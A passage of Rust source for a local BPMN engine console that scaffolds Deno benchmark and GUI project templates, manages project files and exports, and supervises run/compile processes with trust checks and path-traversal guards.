across many connections (~20k/s). The stream's only JS benefit is ~4x lower \
engine memory. Its throughput edge needs a pipelining native producer \
(e.g. Rust), where it beats REST ~32k vs ~20k.\n\n\
## Reclaim disk after the test\n\n\
The benchmark creates ~1M instances; their journal/data can be large. When you're \
done, free the disk with:\n\n\
```sh\nc8ctl nano stop --purge\n```\n\n\
or, equivalently:\n\n\
```sh\nc8ctl nano stop && c8ctl nano clean\n```\n"
        .into()
}

/// Stream variant deno.json: pulls the Nano SDK (drop-in C8 client) which
/// auto-upgrades to the Falcon protocol against a Nano server.
const DEMO_STREAM_DENO_JSON: &str = r#"{
  "imports": {
    "@nanobpm/nano-sdk": "npm:@nanobpm/nano-sdk@^1",
    "@lib/": "./lib/"
  },
  "tasks": {
    "start": "deno run --allow-net --allow-read --allow-write --allow-env --allow-sys main.ts"
  }
}
"#;

/// The falcon entrypoint: identical benchmark to the REST demo, but
/// creation + the worker run through @nanobpm/nano-sdk, which upgrades to the
/// falcon protocol on Nano. A/B it against the REST demo.
const DEMO_STREAM_MAIN_TS: &str = r#"// Throughput (falcon) — same benchmark, run through @nanobpm/nano-sdk.
//
// Identical to the "Throughput (REST)" demo, except instance creation and the
// "tick" worker go through the Nano SDK, which auto-upgrades to the command
// stream when it detects a Nano server. Compare the peak/sec against REST.
import { createCamundaClient } from "@nanobpm/nano-sdk";
import { deployAllResources } from "@lib/nano.ts";

const BASE_URL = (Deno.env.get("NANOBPMN_BASE_URL") ?? "http://localhost:8080").replace(/\/+$/, "");
const PROCESS_ID = "throughput-demo";
const DURATION_MS = 30_000;
const RAMP_EVERY_MS = 2_000;
const RAMP_STEP = 32;

const client = createCamundaClient({
  config: { CAMUNDA_AUTH_STRATEGY: "NONE", CAMUNDA_REST_ADDRESS: BASE_URL, CAMUNDA_TRANSPORT: "auto" },
});

async function residentMb(): Promise<number> {
  try {
    const r = await fetch(`${BASE_URL}/v2/system/memory`);
    const j = await r.json();
    return j.residentBytes ? j.residentBytes / 1_048_576 : 0;
  } catch { return 0; }
}

await deployAllResources();
client.createJobWorker({ jobType: "tick", maxParallelJobs: 200, jobHandler: (job: any) => job.complete({}) });

let created = 0;
let running = true;
let concurrency = 0;

async function creator(): Promise<void> {
  while (running) {
    try {
      await client.createProcessInstance({ processDefinitionId: PROCESS_ID as unknown as never, awaitCompletion: false });
      created++;
    } catch { /* keep pushing */ }
  }
}

console.log("ramping process-instance creation for 30s (Falcon protocol)…\n");
const t0 = performance.now();
let lastCreated = 0;
let peak = 0;
let peakMem = 0;

const tick = setInterval(async () => {
  const total = created;
  const rate = total - lastCreated;
  lastCreated = total;
  if (rate > peak) peak = rate;
  const mem = await residentMb();
  if (mem > peakMem) peakMem = mem;
  console.log(`t+${Math.round((performance.now() - t0) / 1000)}s  conc=${concurrency}  ${rate}/s  (total ${total}, mem ${mem.toFixed(0)}MB)`);
}, 1000);

const ramp = setInterval(() => {
  for (let i = 0; i < RAMP_STEP; i++) creator();
  concurrency += RAMP_STEP;
}, RAMP_EVERY_MS);

for (let i = 0; i < RAMP_STEP; i++) creator();
concurrency = RAMP_STEP;

setTimeout(() => {
  running = false;
  clearInterval(ramp);
  clearInterval(tick);
  console.log(`\n=== peak ${peak} instances/sec (Falcon protocol, fire-and-forget) ===`);
  console.log(`=== ${created} instances created in 30s, ~${Math.round(created / 30)}/s average ===`);
  console.log(`=== peak engine memory ${peakMem.toFixed(0)}MB ===`);
  client.stopAllWorkers?.();
  Deno.exit(0);
}, DURATION_MS);
"#;

fn demo_stream_readme() -> String {
    "# Throughput (falcon)\n\n\
A/B partner to **Throughput (REST)**. Identical 30-second ramp benchmark, but \
instance creation and the `tick` worker run through `@nanobpm/nano-sdk` — a \
drop-in Camunda 8 client that upgrades to Nano's falcon protocol. \
Compare its peak instances/sec against the REST demo to see the wire-protocol \
difference on the same engine.\n\n\
## Run it in the IDE\n\n\
1. Make sure the engine is up (this console is the engine).\n\
2. Open this project and press **Run**; compare the peak with the REST demo.\n\n\
## A/B: falcon vs REST\n\n\
On a clean engine (30s ramp, fire-and-forget):\n\n\
| Metric | Falcon (this demo) | REST |\n\
|---|---|---|\n\
| Peak instances/sec | 4,393 | **8,353** |\n\
| Avg instances/sec | 2,753 | 7,593 |\n\
| Created in 30s | 82,591 | 227,780 |\n\
| Peak engine memory | **58 MB** | 233 MB |\n\n\
The Falcon protocol trades raw throughput for ~4x lower engine memory; REST \
parallelises better over pooled HTTP connections. Run each on a fresh engine \
(`c8ctl nano stop --purge` between runs) for a fair comparison.\n\n\
> **Note:** in JavaScript/Deno the stream does *not* win on throughput — even \
splitting producer and worker into two processes, the SDK awaits one create \
at a time over a single socket (~2–3k/s) vs pooled REST (~20k/s). Pick the \
stream here for low engine memory, not speed; its throughput edge needs a \
pipelining native producer (Rust beats REST ~32k vs ~20k).\n\n\
## Reclaim disk after the test\n\n\
```sh\nc8ctl nano stop --purge\n```\n"
        .into()
}

// ---------------------------------------------------------------------------
// GUI app template (app pack: deno-gui) — served-UI binary
// ---------------------------------------------------------------------------

const GUI_DENO_JSON: &str = r#"{
  "imports": { "@nanobpm/nano-sdk": "npm:@nanobpm/nano-sdk@^1", "@lib/": "./lib/" },
  "tasks": { "start": "deno run --allow-net --allow-read --allow-env main.ts" }
}
"#;

const GUI_MAIN_TS: &str = r#"// GUI app — a self-contained binary serving a UI for your process application.
// deno compile bundles this + ./public into one binary (deno compile --include public).
import { deployAllResources } from "@lib/nano.ts";
const BASE = (Deno.env.get("NANOBPMN_BASE_URL") ?? "http://localhost:8080").replace(/\/+$/, "");
const PORT = Number(Deno.env.get("PORT") ?? 8090);
await deployAllResources();
Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);
  if (url.pathname === "/api/start") {
    const r = await fetch(`${BASE}/v2/process-instances`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ processDefinitionId: "starter", awaitCompletion: false }) });
    return new Response(await r.text(), { headers: { "content-type": "application/json" } });
  }
  const path = url.pathname === "/" ? "/index.html" : url.pathname;
  try { return new Response(await Deno.readTextFile(`./public${path}`), { headers: { "content-type": path.endsWith(".html") ? "text/html" : "text/plain" } }); }
  catch { return new Response("not found", { status: 404 }); }
});
console.log(`GUI app serving on :${PORT}`);
"#;

const GUI_INDEX_HTML: &str = r#"<!doctype html><html><head><meta charset="utf-8"><title>Nano GUI App</title>
<style>body{font:16px system-ui;margin:3rem;max-width:40rem}button{font:inherit;padding:.6rem 1rem}</style></head>
<body><h1>Process application</h1><p>Served by a Nano GUI app binary.</p>
<button onclick="fetch('/api/start',{method:'POST'}).then(r=>r.json()).then(j=>out.textContent=JSON.stringify(j))">Start instance</button>
<pre id="out"></pre></body></html>
"#;

fn gui_readme(name: &str) -> String {
    format!(
        "# {name} (GUI app)\n\n\
A served-UI process application. `main.ts` runs `Deno.serve`, deploys processes \
and serves `public/`. Press **Run**, open the port, or **Compile** to a binary \
(`deno compile --include public`). Future: one-click *Embed Nano* (ADR 0005) \
for a self-contained engine+UI binary.\n"
    )
}
/// overwriting any prior copy so project code imports the current version.
pub fn ensure_project_sdk(name: &str) -> std::io::Result<()> {
    let dir = project_dir(name).ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid project name")
    })?;
    let nano = dir.join(".nanobpm");
    std::fs::create_dir_all(&nano)?;
    std::fs::write(nano.join("worker-sdk.ts"), WORKER_SDK_TS)
}

/// Scaffolds a brand-new project directory. Fails if it already exists.
/// `template` selects which starter content to stamp out ("starter" default, or
/// "throughput" for the benchmark demo). Unknown templates fall back to starter.
pub fn create_project(
    name: &str,
    description: &str,
    template: &str,
) -> Result<ProjectConfig, String> {
    let dir = project_dir(name).ok_or("invalid project name")?;
    if dir.exists() {
        return Err("a project with that name already exists".into());
    }
    let mk = |p: PathBuf| std::fs::create_dir_all(&p).map_err(|e| format!("create {p:?}: {e}"));

    // ── Pack template short-circuit ───────────────────────────────────────
    // If `template` names an installed pack template (or an example pack's
    // own id), stamp out ONLY that pack's contents. The Deno-flavoured
    // built-in files below would otherwise leak into a Java/Rust/etc.
    // project — the caller ended up with a Deno starter with pack files
    // sprinkled on top, and any BPMN the pack shipped got shadowed by
    // resources/processes/*.bpmn from the built-in fallthrough.
    let is_builtin_template = matches!(
        template,
        "starter" | "throughput" | "throughput-stream" | "gui-starter"
    );
    if !is_builtin_template && let Some((m, src)) = super::extensions::template_source(template) {
        mk(dir.clone())?;
        super::extensions::copy_tree(&src, &dir).map_err(|e| format!("copy pack template: {e}"))?;
        // The project's `lang` drives the run/compile toolchain (lang_pack lookup):
        // a LANG pack's own template implies the pack itself; app/example packs
        // name their language via `requires` (first entry = the lang pack id).
        // Only with neither do we fall back to the built-in Deno runtime.
        let cfg_lang = if m.kind == super::extensions::ExtKind::Lang {
            m.id.clone()
        } else {
            m.requires
                .first()
                .cloned()
                .unwrap_or_else(|| "deno".to_string())
        };
        // Best-effort detection of the "main" entrypoint the console
        // surfaces in the workspace toolbar. Ordered from most specific
        // to least so multi-module Java packs prefer the actual module
        // POM over an aggregator root POM. `is_file()` (not `exists()`)
        // so a same-named directory can't masquerade as the entrypoint.
        let candidates: &[&str] = &[
            "src/main.rs",
            "microservice/pom.xml",
            "app/pom.xml",
            "pom.xml",
            "main.ts",
        ];
        let cfg_main = candidates
            .iter()
            .find(|c| dir.join(c).is_file())
            .map(|c| c.to_string())
            .unwrap_or_else(|| "main.ts".to_string());
        let mut cfg = ProjectConfig::new(name, description);
        cfg.lang = cfg_lang;
        cfg.app = "console".to_string();
        cfg.main = cfg_main;
        // Snapshot the pack's toolchain into the project so pack updates or
        // uninstalls don't break existing projects — the project owns its
        // run/compile invocation from this point on.
        if !m.toolchain.run.is_empty()
            || !m.toolchain.compile.is_empty()
            || !m.toolchain.run_configs.is_empty()
        {
            cfg.toolchain = Some(project_toolchain_from_pack(&m));
        }
        cfg.scaffolded_from = Some(ScaffoldedFrom {
            pack: m.id.clone(),
            version: super::extensions::pack_version(&m.id),
        });
        cfg.template = Some(template.to_string());
        write_config(name, &cfg).map_err(|e| format!("write config: {e}"))?;
        return Ok(cfg);
    }

    // ── Built-in (Deno-flavoured) scaffolds ───────────────────────────────
    mk(dir.join("resources").join("processes"))?;
    mk(dir.join("resources").join("decisions"))?;
    mk(dir.join("resources").join("forms"))?;
    mk(dir.join("lib"))?;
    mk(dir.join(".nanobpm"))?;

    let w =
        |p: PathBuf, body: &str| std::fs::write(&p, body).map_err(|e| format!("write {p:?}: {e}"));
    w(dir.join("deno.json"), PROJECT_DENO_JSON)?;
    w(dir.join(".nanobpm").join("worker-sdk.ts"), WORKER_SDK_TS)?;
    w(dir.join("lib").join("nano.ts"), NANO_LIB_TS)?;

    // All remaining built-in scaffolds are Deno-flavoured (Rust/Java are
    // pack-provided), so lang/main are fixed; only `gui-starter` varies `app`.
    let cfg_lang = "deno".to_string();
    let mut cfg_app = "console";
    let cfg_main = "main.ts".to_string();

    if template == "throughput" {
        let worker = dir.join("workers").join("tick");
        mk(worker.clone())?;
        w(dir.join("main.ts"), DEMO_MAIN_TS)?;
        w(dir.join("README.md"), &demo_readme())?;
        w(
            dir.join("resources")
                .join("processes")
                .join("throughput.bpmn"),
            DEMO_PROCESS_BPMN,
        )?;
        w(worker.join("worker.ts"), DEMO_WORKER_TS)?;
        w(worker.join("deno.json"), WORKER_DENO_JSON)?;
    } else if template == "throughput-stream" {
        w(dir.join("deno.json"), DEMO_STREAM_DENO_JSON)?;
        w(dir.join("main.ts"), DEMO_STREAM_MAIN_TS)?;
        w(dir.join("README.md"), &demo_stream_readme())?;
        w(
            dir.join("resources")
                .join("processes")
                .join("throughput.bpmn"),
            DEMO_PROCESS_BPMN,
        )?;
    } else if template == "gui-starter" {
        mk(dir.join("public"))?;
        w(dir.join("deno.json"), GUI_DENO_JSON)?;
        w(dir.join("main.ts"), GUI_MAIN_TS)?;
        w(dir.join("public").join("index.html"), GUI_INDEX_HTML)?;
        w(dir.join("README.md"), &gui_readme(name))?;
        w(
            dir.join("resources")
                .join("processes")
                .join(format!("{name}.bpmn")),
            &starter_process(name),
        )?;
        cfg_app = "deno-gui";
    } else {
        let starter_worker = dir.join("workers").join("do-work");
        mk(starter_worker.clone())?;
        w(dir.join("main.ts"), MAIN_TS)?;
        w(dir.join("README.md"), &readme_md(name))?;
        w(
            dir.join("resources")
                .join("processes")
                .join(format!("{name}.bpmn")),
            &starter_process(name),
        )?;
        w(starter_worker.join("worker.ts"), STARTER_WORKER_TS)?;
        w(starter_worker.join("deno.json"), WORKER_DENO_JSON)?;
    }

    let mut cfg = ProjectConfig::new(name, description);
    cfg.lang = cfg_lang;
    cfg.app = cfg_app.to_string();
    cfg.main = cfg_main;
    // Record which built-in template was stamped out. Unknown ids fall through
    // to the "starter" scaffold above, so that's what we record. `scaffolded_from`
    // stays None here — its absence is how the Console distinguishes a built-in
    // template from a pack-contributed one.
    cfg.template = Some(
        if matches!(template, "throughput" | "throughput-stream" | "gui-starter") {
            template
        } else {
            "starter"
        }
        .to_string(),
    );
    write_config(name, &cfg).map_err(|e| format!("write config: {e}"))?;
    Ok(cfg)
}

/// Deletes a project directory and everything in it.
pub fn delete_project(name: &str) -> std::io::Result<()> {
    let dir = project_dir(name).ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "invalid project name")
    })?;
    std::fs::remove_dir_all(dir)
}

/// Renames a project directory and updates its persisted config name. Fails if
/// the source is missing, the target name is unsafe, or the target exists. The
/// caller must ensure the project is stopped first.
pub fn rename_project(old: &str, new: &str) -> Result<ProjectConfig, String> {
    let from = project_dir(old).ok_or("invalid project name")?;
    let to = project_dir(new).ok_or("invalid new name")?;
    if !from.is_dir() {
        return Err("no such project".into());
    }
    if to.exists() {
        return Err("a project with that name already exists".into());
    }
    std::fs::rename(&from, &to).map_err(|e| format!("rename: {e}"))?;
    let mut cfg = read_config(new).ok_or("config missing after rename")?;
    cfg.name = new.to_string();
    cfg.updated_ms = now_ms();
    write_config(new, &cfg).map_err(|e| format!("write config: {e}"))?;
    Ok(cfg)
}

// ---------------------------------------------------------------------------
// Listing / tiles
// ---------------------------------------------------------------------------

/// Tile-level summary of a project for the manager grid.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ProjectSummary {
    pub name: String,
    pub description: String,
    pub deploy_target: String,
    pub updated_ms: u64,
    pub processes: usize,
    pub decisions: usize,
    pub forms: usize,
    pub workers: usize,
    pub running: bool,
    /// Language pack id (from the project config; default "deno"). The Console
    /// resolves the card's language icon by matching this to a lang Extension.
    pub lang: String,
    /// Scaffold template id, when recorded. Absent on projects created before
    /// this breadcrumb existed.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub template: Option<String>,
    /// Pack that scaffolded the project, when it came from an installed pack.
    /// Absent for built-in templates (the `template` id alone then identifies
    /// the built-in scaffold).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub scaffolded_from: Option<ScaffoldedFrom>,
}

fn count_ext(dir: &Path, ext: &str) -> usize {
    std::fs::read_dir(dir)
        .map(|rd| {
            rd.flatten()
                .filter(|e| e.path().extension().map(|x| x == ext).unwrap_or(false))
                .count()
        })
        .unwrap_or(0)
}

fn count_dirs(dir: &Path) -> usize {
    std::fs::read_dir(dir)
        .map(|rd| rd.flatten().filter(|e| e.path().is_dir()).count())
        .unwrap_or(0)
}

/// Lists every project (each subdirectory of the projects root). `running` is
/// left `false` here; the handler fills it from the supervisor.
pub fn list_projects() -> std::io::Result<Vec<ProjectSummary>> {
    let root = ensure_projects_root()?;
    let mut out = Vec::new();
    for entry in std::fs::read_dir(&root)?.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if name.starts_with('.') || !workspace::is_safe_name(name) {
            continue;
        }
        let cfg = read_config(name).unwrap_or_else(|| ProjectConfig::new(name, ""));
        let res = path.join("resources");
        out.push(ProjectSummary {
            name: name.to_string(),
            description: cfg.description,
            deploy_target: cfg.deploy_target,
            updated_ms: cfg.updated_ms,
            processes: count_ext(&res.join("processes"), "bpmn"),
            decisions: count_ext(&res.join("decisions"), "dmn"),
            forms: count_ext(&res.join("forms"), "form"),
            workers: count_dirs(&path.join("workers")),
            running: false,
            lang: cfg.lang,
            template: cfg.template,
            scaffolded_from: cfg.scaffolded_from,
        });
    }
    out.sort_by(|a, b| b.updated_ms.cmp(&a.updated_ms).then(a.name.cmp(&b.name)));
    Ok(out)
}

// ---------------------------------------------------------------------------
// File tree
// ---------------------------------------------------------------------------

/// A node in the project file tree.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FileNode {
    /// Display name (the last path segment).
    pub name: String,
    /// Project-relative path (`/`-separated).
    pub path: String,
    /// `"dir"` or `"file"`.
    pub kind: &'static str,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub children: Option<Vec<FileNode>>,
}

/// Hidden / generated entries never shown in the browser.
fn is_hidden(name: &str) -> bool {
    name.starts_with('.') || name == "node_modules"
}

fn read_tree(dir: &Path, rel: &str) -> Vec<FileNode> {
    let mut entries: Vec<_> = std::fs::read_dir(dir)
        .map(|rd| rd.flatten().collect())
        .unwrap_or_default();
    entries.sort_by_key(|e| {
        let p = e.path();
        // Directories first, then alphabetical.
        (!p.is_dir(), e.file_name().to_string_lossy().to_lowercase())
    });
    let mut out = Vec::new();
    for entry in entries {
        let name = entry.file_name().to_string_lossy().to_string();
        if is_hidden(&name) {
            continue;
        }
        let child_rel = if rel.is_empty() {
            name.clone()
        } else {
            format!("{rel}/{name}")
        };
        let path = entry.path();
        if path.is_dir() {
            out.push(FileNode {
                children: Some(read_tree(&path, &child_rel)),
                name,
                path: child_rel,
                kind: "dir",
            });
        } else {
            out.push(FileNode {
                name,
                path: child_rel,
                kind: "file",
                children: None,
            });
        }
    }
    out
}

/// Builds the recursive file tree for a project (excluding hidden/generated
/// entries), or `None` when the project does not exist.
pub fn file_tree(name: &str) -> Option<Vec<FileNode>> {
    let dir = project_dir(name)?;
    if !dir.is_dir() {
        return None;
    }
    Some(read_tree(&dir, ""))
}

// ---------------------------------------------------------------------------
// Export — zip the whole project
// ---------------------------------------------------------------------------

/// Walks the project collecting `(zip-relative-path, bytes)` for every file,
/// skipping caches and the compiled `dist/` output unless asked.
fn collect_files(dir: &Path, prefix: &str, include_dist: bool, out: &mut Vec<(String, Vec<u8>)>) {
    let Ok(rd) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in rd.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if name == ".deno-cache" || name == "node_modules" {
            continue;
        }
        if name == "dist" && !include_dist {
            continue;
        }
        let path = entry.path();
        let zip_path = format!("{prefix}/{name}");
        if path.is_dir() {
            collect_files(&path, &zip_path, include_dist, out);
        } else if let Ok(bytes) = std::fs::read(&path) {
            out.push((zip_path, bytes));
        }
    }
}

/// Zips an entire project into a downloadable, runnable archive (nested under
/// `<name>/`). Compiled binaries under `dist/` are included when `include_dist`.
pub fn export_zip(name: &str, include_dist: bool) -> Result<Vec<u8>, String> {
    let dir = project_dir(name).ok_or("invalid project name")?;
    if !dir.is_dir() {
        return Err("no such project".into());
    }
    // Refresh the SDK so the exported app imports the current version.
    let _ = ensure_project_sdk(name);
    let mut entries = Vec::new();
    collect_files(&dir, name, include_dist, &mut entries);
    if entries.is_empty() {
        return Err("project is empty".into());
    }
    entries.sort_by(|a, b| a.0.cmp(&b.0));
    Ok(worker_export::build_stored_zip(&entries))
}

/// The download filename for a project export.
pub fn export_filename(name: &str) -> String {
    format!("{name}.zip")
}

// ---------------------------------------------------------------------------
// Run / compile supervisor
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
enum Phase {
    Stopped,
    Starting,
    Running,
    Crashed,
}

/// A single log line from a project's run/compile output.
#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LogLine {
    pub ts_ms: u64,
    /// `out` (stdout), `err` (stderr), or `sys` (supervisor notes).
    pub stream: String,
    pub text: String,
}

/// Runtime view of one project's run state.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RunStateDto {
    status: Phase,
    pid: Option<u32>,
    started_at_ms: Option<u64>,
    last_error: Option<String>,
    /// Whether a compile is currently in progress.
    compiling: bool,
}

struct ProjectInner {
    phase: Mutex<Phase>,
    last_error: Mutex<Option<String>>,
    started_at_ms: Mutex<Option<u64>>,
    pid: AtomicU32,
    desired_running: AtomicBool,
    compiling: AtomicBool,
    stop: Notify,
    logs_tx: broadcast::Sender<LogLine>,
    log_ring: Mutex<VecDeque<LogLine>>,
}

impl ProjectInner {
    fn new() -> Arc<Self> {
        let (logs_tx, _) = broadcast::channel(256);
        Arc::new(Self {
            phase: Mutex::new(Phase::Stopped),
            last_error: Mutex::new(None),
            started_at_ms: Mutex::new(None),
            pid: AtomicU32::new(0),
            desired_running: AtomicBool::new(false),
            compiling: AtomicBool::new(false),
            stop: Notify::new(),
            logs_tx,
            log_ring: Mutex::new(VecDeque::with_capacity(LOG_RING_CAP)),
        })
    }

    async fn push_log(&self, stream: &str, text: String) {
        let line = LogLine {
            ts_ms: now_ms(),
            stream: stream.to_string(),
            text,
        };
        {
            let mut ring = self.log_ring.lock().await;
            if ring.len() >= LOG_RING_CAP {
                ring.pop_front();
            }
            ring.push_back(line.clone());
        }
        let _ = self.logs_tx.send(line);
    }

    async fn dto(&self) -> RunStateDto {
        let pid = self.pid.load(Ordering::Relaxed);
        RunStateDto {
            status: *self.phase.lock().await,
            pid: (pid != 0).then_some(pid),
            started_at_ms: *self.started_at_ms.lock().await,
            last_error: self.last_error.lock().await.clone(),
            compiling: self.compiling.load(Ordering::Relaxed),
        }
    }
}

/// Process-global supervisor for project run/compile, keyed by project name.
pub struct ProjectSupervisor {
    projects: Mutex<HashMap<String, Arc<ProjectInner>>>,
}

static SUPERVISOR: OnceLock<ProjectSupervisor> = OnceLock::new();

/// Returns the trust-store ext id to gate a snapshotted argv on. `nanobpm.project.json`
/// is user-editable, so we cannot naively trust `cfg.scaffolded_from.pack` — a
/// project could otherwise claim to have been scaffolded by any already-trusted
/// pack and then run arbitrary argv under that pack's approval. We only credit
/// `scaffolded_from.pack` when its currently-installed manifest still declares
/// the same argv; anything else (pack uninstalled, pack updated to a different
/// toolchain, user edited the snapshot) falls back to `cfg.lang`, forcing the
/// user to explicitly approve running unrecognised commands.
fn snapshot_trust_id(cfg: &ProjectConfig, snapshot_argv: &[String], kind: ArgvKind) -> String {
    if let Some(sf) = cfg.scaffolded_from.as_ref()
        && let Some(m) = super::extensions::find_ext(&sf.pack)
    {
        let declared = match kind {
            ArgvKind::Run => &m.toolchain.run,
            ArgvKind::Compile => &m.toolchain.compile,
        };
        if !declared.is_empty() && declared.as_slice() == snapshot_argv {
            return sf.pack.clone();
        }
    }
    cfg.lang.clone()
}

#[derive(Copy, Clone)]
enum ArgvKind {
    Run,
    Compile,
}

/// Picks the active [`ProjectRunConfig`] on the project, or `None` if there
/// are no run configs. Precedence: `active_run_config` id match → the entry
/// flagged `default: true` → the first entry.
fn active_run_config(tc: &ProjectToolchain) -> Option<&ProjectRunConfig> {
    if tc.run_configs.is_empty() {
        return None;
    }
    if let Some(id) = tc.active_run_config.as_deref()
        && let Some(rc) = tc.run_configs.iter().find(|rc| rc.id == id)
    {
        return Some(rc);
    }
    tc.run_configs
        .iter()
        .find(|rc| rc.default)
        .or_else(|| tc.run_configs.first())
}

/// Best-effort trust check for run-config argv: allow if the currently-
/// installed scaffolding pack still declares an identical `run`/`compile`
/// argv on any of its `run_configs`. Same semantics as [`snapshot_trust_id`].
fn snapshot_trust_id_for_config(
    cfg: &ProjectConfig,
    snapshot_argv: &[String],
    kind: ArgvKind,
) -> String {
    if let Some(sf) = cfg.scaffolded_from.as_ref()
        && let Some(m) = super::extensions::find_ext(&sf.pack)
    {
        let matches = m.toolchain.run_configs.iter().any(|rc| {
            let declared = match kind {
                ArgvKind::Run => &rc.run,
                ArgvKind::Compile => &rc.compile,
            };
            !declared.is_empty() && declared.as_slice() == snapshot_argv
        });
        if matches {
            return sf.pack.clone();
        }
        // Fall through to the flat check — a hand-edited or pack-updated
        // project might still match the pack's top-level run/compile.
        let declared = match kind {
            ArgvKind::Run => &m.toolchain.run,
            ArgvKind::Compile => &m.toolchain.compile,
        };
        if !declared.is_empty() && declared.as_slice() == snapshot_argv {
            return sf.pack.clone();
        }
    }
    cfg.lang.clone()
}

/// Resolves the Run argv + the trust-store ext id gating it, in order:
///   1. Active [`ProjectRunConfig`] (when the project has run configs) —
///      its `run` argv wins; trust binds to the scaffolding pack when the
///      pack still declares it, else to `cfg.lang`.
///   2. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
///      `scaffoldedFrom.pack` only when the installed pack still declares the
///      identical argv (see [`snapshot_trust_id`]); otherwise `cfg.lang`.
///   3. Lang pack's `toolchain.run` (covers lang-pack starter templates that
///      don't override, e.g. plain Rust) — trust binds to the lang pack.
///   4. `None` — the caller falls through to the built-in Deno runner.
fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
    if let Some(tc) = cfg.toolchain.as_ref() {
        if let Some(rc) = active_run_config(tc)
            && !rc.run.is_empty()
        {
            let trust = snapshot_trust_id_for_config(cfg, &rc.run, ArgvKind::Run);
            return Some((rc.run.clone(), trust));
        }
        if !tc.run.is_empty() {
            let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
            return Some((tc.run.clone(), trust));
        }
    }
    if cfg.lang != "deno"
        && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
        && !pack.toolchain.run.is_empty()
    {
        return Some((pack.toolchain.run.clone(), pack.id));
    }
    None
}

/// Same precedence as [`resolve_run_argv`], but for `toolchain.compile`.
fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
    if let Some(tc) = cfg.toolchain.as_ref() {
        if let Some(rc) = active_run_config(tc)
            && !rc.compile.is_empty()
        {
            let trust = snapshot_trust_id_for_config(cfg, &rc.compile, ArgvKind::Compile);
            return Some((rc.compile.clone(), trust));
        }
        if !tc.compile.is_empty() {
            let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
            return Some((tc.compile.clone(), trust));
        }
    }
    if cfg.lang != "deno"
        && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
        && !pack.toolchain.compile.is_empty()
    {
        return Some((pack.toolchain.compile.clone(), pack.id));
    }
    None
}

/// Env vars to layer on top of the base environment when spawning Run/Compile.
/// Precedence (low → high, last wins):
///   1. base spawn env (set by the runner at the `Command::env` calls above)
///   2. project-scoped `cfg.env` (applies to every run config)
///   3. active [`ProjectRunConfig`]'s `env` (per-config overrides)
fn resolve_run_env(cfg: &ProjectConfig) -> std::collections::BTreeMap<String, String> {
    let mut out = cfg.env.clone();
    if let Some(rc) = cfg.toolchain.as_ref().and_then(active_run_config) {
        for (k, v) in &rc.env {
            out.insert(k.clone(), v.clone());
        }
    }
    out
}

pub fn supervisor() -> &'static ProjectSupervisor {
    SUPERVISOR.get_or_init(|| ProjectSupervisor {
        projects: Mutex::new(HashMap::new()),
    })
}

impl ProjectSupervisor {
    pub fn deno_available(&self) -> bool {
        workers::find_deno().is_some()
    }

    async fn entry(&self, name: &str) -> Arc<ProjectInner> {
        let mut map = self.projects.lock().await;
        map.entry(name.to_string())
            .or_insert_with(ProjectInner::new)
            .clone()
    }

    /// Run state for one project (defaults to stopped if unknown).
    pub async fn run_state(&self, name: &str) -> RunStateDto {
        self.entry(name).await.dto().await
    }

    pub async fn is_running(&self, name: &str) -> bool {
        let inner = self.entry(name).await;
        matches!(*inner.phase.lock().await, Phase::Starting | Phase::Running)
    }

    pub async fn log_history(&self, name: &str) -> Vec<LogLine> {
        let inner = self.entry(name).await;
        inner.log_ring.lock().await.iter().cloned().collect()
    }

    pub async fn subscribe(&self, name: &str) -> broadcast::Receiver<LogLine> {
        self.entry(name).await.logs_tx.subscribe()
    }

    /// Resolves the base URL the app should deploy to: the project's configured
    /// deploy target, defaulting to the live gateway when empty/localhost.
    fn base_url(cfg: &ProjectConfig) -> String {
        let t = cfg.deploy_target.trim().trim_end_matches('/');
        if t.is_empty() {
            format!("http://127.0.0.1:{}", workers::gateway_port())
        } else {
            t.to_string()
        }
    }

    /// Enumerates deployable resource files under a project directory.
    ///
    /// For each configured subdirectory: rejects any value with non-`Normal`
    /// path components (`..`, absolute paths, root, prefix) so an
    /// attacker-controlled `nanobpm.project.json` can't traverse out of the
    /// project. Then canonicalises the resolved subdirectory and requires it
    /// to sit under the canonicalised project root — symlink chases can't
    /// escape either. Non-existent / non-directory / non-canonicalisable
    /// entries are silently skipped (a project without a `decisions/` dir is
    /// normal, not an error).
    ///
    /// Files are matched by extension (`.bpmn`, `.dmn`, `.form`) and sorted
    /// within each directory so log lines / deployment order are stable
    /// across filesystems.
    ///
    /// Pure: no HTTP, no logs. Kept out of `auto_deploy_resources` for tests.
    async fn discover_deployables(project_dir: &Path, dirs: &[String]) -> Vec<PathBuf> {
        let root_canonical = match tokio::fs::canonicalize(project_dir).await {
            Ok(p) => p,
            Err(_) => return Vec::new(),
        };
        let mut files: Vec<PathBuf> = Vec::new();
        for sub in dirs {
            let sub_path = Path::new(sub);
            // Reject `..`, absolute paths, drive prefixes, etc. Only ordinary
            // "look in this named directory" values are accepted.
            let clean = sub_path
                .components()
                .all(|c| matches!(c, std::path::Component::Normal(_)));
            if !clean {
                continue;
            }
            let joined = root_canonical.join(sub_path);
            let resolved = match tokio::fs::canonicalize(&joined).await {
                Ok(p) => p,
                Err(_) => continue, // missing dir is expected
            };
